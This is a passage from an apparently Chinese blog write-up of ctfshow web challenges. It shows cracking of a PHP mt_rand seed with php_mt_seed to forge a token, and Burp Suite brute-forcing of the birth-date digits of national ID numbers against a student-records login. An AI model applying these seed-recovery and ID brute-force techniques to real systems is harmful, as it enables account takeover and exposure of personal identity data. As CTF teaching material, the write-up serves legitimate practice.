<span class="line"><span style="color:#dcdcaa">Found</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0</span><span style="color:#ce9178">,</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">trying</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x14000000</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">-</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x17ffffff</span><span style="color:#ce9178">,</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">speed</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">16777.2</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">Mseeds/s</span><span style="color:#d4d4d4"> </span></span>
<span class="line"><span style="color:#dcdcaa">seed</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x1623e1be</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">371450302</span><span style="color:#d4d4d4"> (PHP </span><span style="color:#b5cea8">3.0</span><span style="color:#ce9178">.7</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">to</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">5.2</span><span style="color:#ce9178">.0</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#dcdcaa">seed</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x1623e1bf</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">371450303</span><span style="color:#d4d4d4"> (PHP </span><span style="color:#b5cea8">3.0</span><span style="color:#ce9178">.7</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">to</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">5.2</span><span style="color:#ce9178">.0</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#dcdcaa">Found</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">2</span><span style="color:#ce9178">,</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">trying</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x9c000000</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">-</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x9fffffff</span><span style="color:#ce9178">,</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">speed</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">13775.0</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">Mseeds/s</span><span style="color:#d4d4d4"> </span></span>
<span class="line"><span style="color:#dcdcaa">seed</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x9c565330</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">2622903088</span><span style="color:#d4d4d4"> (PHP </span><span style="color:#b5cea8">3.0</span><span style="color:#ce9178">.7</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">to</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">5.2</span><span style="color:#ce9178">.0</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#dcdcaa">seed</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x9c565331</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">2622903089</span><span style="color:#d4d4d4"> (PHP </span><span style="color:#b5cea8">3.0</span><span style="color:#ce9178">.7</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">to</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">5.2</span><span style="color:#ce9178">.0</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#dcdcaa">Found</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">4</span><span style="color:#ce9178">,</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">trying</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0xfc000000</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">-</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0xffffffff</span><span style="color:#ce9178">,</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">speed</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">13638.3</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">Mseeds/s</span><span style="color:#d4d4d4"> </span></span>
<span class="line"><span style="color:#dcdcaa">Version:</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">5.2</span><span style="color:#ce9178">.1+</span></span>
<span class="line"><span style="color:#dcdcaa">Found</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">4</span><span style="color:#ce9178">,</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">trying</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x08000000</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">-</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x09ffffff</span><span style="color:#ce9178">,</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">speed</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">114.7</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">Mseeds/s</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">Found</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">4</span><span style="color:#ce9178">,</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">trying</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x14000000</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">-</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x15ffffff</span><span style="color:#ce9178">,</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">speed</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">109.7</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">Mseeds/s</span><span style="color:#d4d4d4"> </span></span>
<span class="line"><span style="color:#dcdcaa">seed</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x14a24111</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">346177809</span><span style="color:#d4d4d4"> (PHP </span><span style="color:#b5cea8">7.1</span><span style="color:#ce9178">.0+</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#dcdcaa">Found</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">5</span><span style="color:#ce9178">,</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">trying</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0xfe000000</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">-</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0xffffffff</span><span style="color:#ce9178">,</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">speed</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">106.7</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">Mseeds/s</span><span style="color:#d4d4d4"> </span></span>
<span class="line"><span style="color:#dcdcaa">Found</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">5</span></span>
<span class="line"><span style="color:#dcdcaa">./php_mt_seed</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">2105788890</span><span style="color:#d4d4d4">  </span><span style="color:#b5cea8">153.43</span><span style="color:#ce9178">s</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">user</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0.31</span><span style="color:#ce9178">s</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">system</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">379</span><span style="color:#ce9178">%</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">cpu</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">40.512</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">total</span></span></code></pre></div></div></figure><p>即五个可能种子：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">seed</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x1623e1be</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">371450302</span><span style="color:#d4d4d4"> (PHP </span><span style="color:#b5cea8">3.0</span><span style="color:#ce9178">.7</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">to</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">5.2</span><span style="color:#ce9178">.0</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#dcdcaa">seed</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x1623e1bf</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">371450303</span><span style="color:#d4d4d4"> (PHP </span><span style="color:#b5cea8">3.0</span><span style="color:#ce9178">.7</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">to</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">5.2</span><span style="color:#ce9178">.0</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#dcdcaa">seed</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x9c565330</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">2622903088</span><span style="color:#d4d4d4"> (PHP </span><span style="color:#b5cea8">3.0</span><span style="color:#ce9178">.7</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">to</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">5.2</span><span style="color:#ce9178">.0</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#dcdcaa">seed</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x9c565331</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">2622903089</span><span style="color:#d4d4d4"> (PHP </span><span style="color:#b5cea8">3.0</span><span style="color:#ce9178">.7</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">to</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">5.2</span><span style="color:#ce9178">.0</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#dcdcaa">seed</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x14a24111</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">346177809</span><span style="color:#d4d4d4"> (PHP </span><span style="color:#b5cea8">7.1</span><span style="color:#ce9178">.0+</span><span style="color:#d4d4d4">)</span></span></code></pre></div></div></figure><p>然后根据第二个 if 语句，我们需要得到后面两个伪随机数进行相加得 token 值。这里直接将五个种子全试一遍找出有效种子（注意不同的种子有各自的 php 版本）</p><p>输出伪随机数：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#dcdcaa">mt_srand</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">346177809</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">mt_rand</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\r\n</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">mt_rand</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\r\n</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">mt_rand</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\r\n</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">439729451</span><span style="color:#d4d4d4">+</span><span style="color:#b5cea8">1215126193</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span>
<span class="line"><span style="color:#6a9955">// 这里直接输出的第五个种子的结果</span></span></code></pre></div></div></figure><p>测试：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">seed5</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">0x14a24111</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">346177809</span><span style="color:#d4d4d4"> (PHP </span><span style="color:#b5cea8">7.1</span><span style="color:#ce9178">.0+</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#dcdcaa">result:</span></span>
<span class="line"><span style="color:#dcdcaa">2105788890</span></span>
<span class="line"><span style="color:#dcdcaa">439729451</span></span>
<span class="line"><span style="color:#dcdcaa">1215126193</span></span>
<span class="line"><span style="color:#dcdcaa">相加结果：</span></span>
<span class="line"><span style="color:#dcdcaa">1654855644</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">r</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">2105788890</span></span>
<span class="line"><span style="color:#dcdcaa">token</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">=</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">1654855644</span></span></code></pre></div></div></figure><p>得到 flag：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150144.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221101001452995"></p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{47a8c33d-8937-45c8-b24b-382998869c60}</span></span></code></pre></div></div></figure><h3 id="web26json爆破-可以传参逃课"><a class="markdownIt-Anchor" href="#web26json爆破-可以传参逃课"></a> web26	(json 爆破 可以传参逃课)</h3><p>hint: 这个可以爆</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:grey">&lt;</span><span style="color:#569cd6">script</span><span style="color:grey">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">	function check()</span><span style="color:#569cd6">{</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#9cdcfe">$</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">ajax</span><span style="color:#d4d4d4">({</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#9cdcfe">url:</span><span style="color:#ce9178">'checkdb.php'</span><span style="color:#d4d4d4">,</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#9cdcfe">type:</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'POST'</span><span style="color:#d4d4d4">,</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#9cdcfe">dataType:</span><span style="color:#ce9178">'json'</span><span style="color:#d4d4d4">,</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#9cdcfe">data:</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#ce9178">'a'</span><span style="color:#9cdcfe">:</span><span style="color:#dcdcaa">$</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'#a'</span><span style="color:#d4d4d4">).</span><span style="color:#dcdcaa">val</span><span style="color:#d4d4d4">(),</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#ce9178">'p'</span><span style="color:#9cdcfe">:</span><span style="color:#dcdcaa">$</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'#p'</span><span style="color:#d4d4d4">).</span><span style="color:#dcdcaa">val</span><span style="color:#d4d4d4">(),</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#ce9178">'d'</span><span style="color:#9cdcfe">:</span><span style="color:#dcdcaa">$</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'#d'</span><span style="color:#d4d4d4">).</span><span style="color:#dcdcaa">val</span><span style="color:#d4d4d4">(),</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#ce9178">'u'</span><span style="color:#9cdcfe">:</span><span style="color:#dcdcaa">$</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'#u'</span><span style="color:#d4d4d4">).</span><span style="color:#dcdcaa">val</span><span style="color:#d4d4d4">(),</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#ce9178">'pass'</span><span style="color:#9cdcfe">:</span><span style="color:#dcdcaa">$</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'#pass'</span><span style="color:#d4d4d4">).</span><span style="color:#dcdcaa">val</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">		},</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#dcdcaa">success</span><span style="color:#9cdcfe">:</span><span style="color:#569cd6">function</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">data</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#dcdcaa">alert</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">data</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'msg'</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">		},</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#dcdcaa">error</span><span style="color:#9cdcfe">:</span><span style="color:#569cd6">function</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">data</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#dcdcaa">alert</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">data</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'msg'</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">		}</span></span>
<span class="line"><span style="color:#d4d4d4">		});</span></span>
<span class="line"><span style="color:#d4d4d4">	</span><span style="color:#569cd6">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:grey">&lt;/</span><span style="color:#569cd6">script</span><span style="color:grey">&gt;</span></span></code></pre></div></div></figure><p>注意是 post 类型，访问 checkdb.php 直接 post 一下：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">Post</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">data：a=</span><span style="color:#d4d4d4">&amp;</span><span style="color:#9cdcfe">p</span><span style="color:#d4d4d4">=&amp;</span><span style="color:#9cdcfe">d</span><span style="color:#d4d4d4">=&amp;</span><span style="color:#9cdcfe">u</span><span style="color:#d4d4d4">=&amp;</span><span style="color:#9cdcfe">pass</span><span style="color:#d4d4d4">=</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150034.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221101004757824"></p><p>提示说是要进行爆破密码，可以去尝试。</p><h3 id="web27日期爆破"><a class="markdownIt-Anchor" href="#web27日期爆破"></a> web27	(日期爆破)</h3><p>启动环境，是一个教务管理系统。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150827.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221101193500300"></p><p>从中可以看到两个重要信息，一个是录取名单一个是学籍信息。下载录取名单之后发现有一部分的身份证号，又根据学籍信息查询登录界面可知，要爆破身份证号。</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">序号	姓名	专业		身份证号码		 备注</span></span>
<span class="line"><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">	高先伊	 WEB	</span><span style="color:#b5cea8">621022</span><span style="color:#d4d4d4">********</span><span style="color:#b5cea8">5237</span><span style="color:#d4d4d4">	</span></span>
<span class="line"><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">	嵇开梦	 MISC	</span><span style="color:#b5cea8">360730</span><span style="color:#d4d4d4">********</span><span style="color:#b5cea8">7653</span><span style="color:#d4d4d4">	党员</span></span>
<span class="line"><span style="color:#b5cea8">3</span><span style="color:#d4d4d4">	郎康焕	 RE		</span><span style="color:#b5cea8">522601</span><span style="color:#d4d4d4">********</span><span style="color:#b5cea8">8092</span><span style="color:#d4d4d4">	</span></span>
<span class="line"><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">	元羿谆	 PWN	</span><span style="color:#b5cea8">451023</span><span style="color:#d4d4d4">********</span><span style="color:#b5cea8">3419</span><span style="color:#d4d4d4">	生源地贷款</span></span>
<span class="line"><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">	祁落兴	 CRYPTO	</span><span style="color:#b5cea8">410927</span><span style="color:#d4d4d4">********</span><span style="color:#b5cea8">5570</span></span></code></pre></div></div></figure><p>先查看学籍信息查询系统的源代码，发现是 post 传参：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:grey">&lt;</span><span style="color:#569cd6">script</span><span style="color:grey">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">	function check()</span><span style="color:#569cd6">{</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#9cdcfe">$</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">ajax</span><span style="color:#d4d4d4">({</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#9cdcfe">url:</span><span style="color:#ce9178">'checkdb.php'</span><span style="color:#d4d4d4">,</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#9cdcfe">type:</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'POST'</span><span style="color:#d4d4d4">,</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#9cdcfe">dataType:</span><span style="color:#ce9178">'json'</span><span style="color:#d4d4d4">,</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#9cdcfe">data:</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#ce9178">'a'</span><span style="color:#9cdcfe">:</span><span style="color:#dcdcaa">$</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'#a'</span><span style="color:#d4d4d4">).</span><span style="color:#dcdcaa">val</span><span style="color:#d4d4d4">(),</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#ce9178">'p'</span><span style="color:#9cdcfe">:</span><span style="color:#dcdcaa">$</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'#p'</span><span style="color:#d4d4d4">).</span><span style="color:#dcdcaa">val</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">		},</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#dcdcaa">success</span><span style="color:#9cdcfe">:</span><span style="color:#569cd6">function</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">data</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#dcdcaa">alert</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">data</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'msg'</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">		},</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#dcdcaa">error</span><span style="color:#9cdcfe">:</span><span style="color:#569cd6">function</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">data</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#dcdcaa">alert</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">data</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'msg'</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">		}</span></span>
<span class="line"><span style="color:#d4d4d4">	});</span></span>
<span class="line"><span style="color:#569cd6">}</span></span>
<span class="line"><span style="color:grey">&lt;/</span><span style="color:#569cd6">script</span><span style="color:grey">&gt;</span></span></code></pre></div></div></figure><p>而且 a 对应姓名，p 对应身份证号码。</p><p>post 传参爆破：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">post</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">data：a=高先伊</span><span style="color:#d4d4d4">&amp;</span><span style="color:#9cdcfe">p</span><span style="color:#d4d4d4">=</span><span style="color:#b5cea8">621022</span><span style="color:#569cd6">********</span><span style="color:#ce9178">5237</span></span></code></pre></div></div></figure><p>这里有个坑。bp 并不能抓到 checkdb.php 的包（火狐浏览器下）</p><p>尝试用别的浏览器抓包复制请求头</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150216.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221101205242533">然后使用 burp suite 进行爆破。</p><p>爆破设置如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150329.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221101205152531"></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150322.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221101205045607"></p><p>得到结果：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150942.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221101205634984"></p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">身份证号码：</span></span>
<span class="line"><span style="color:#dcdcaa">621022199002015237</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">回显：</span></span>
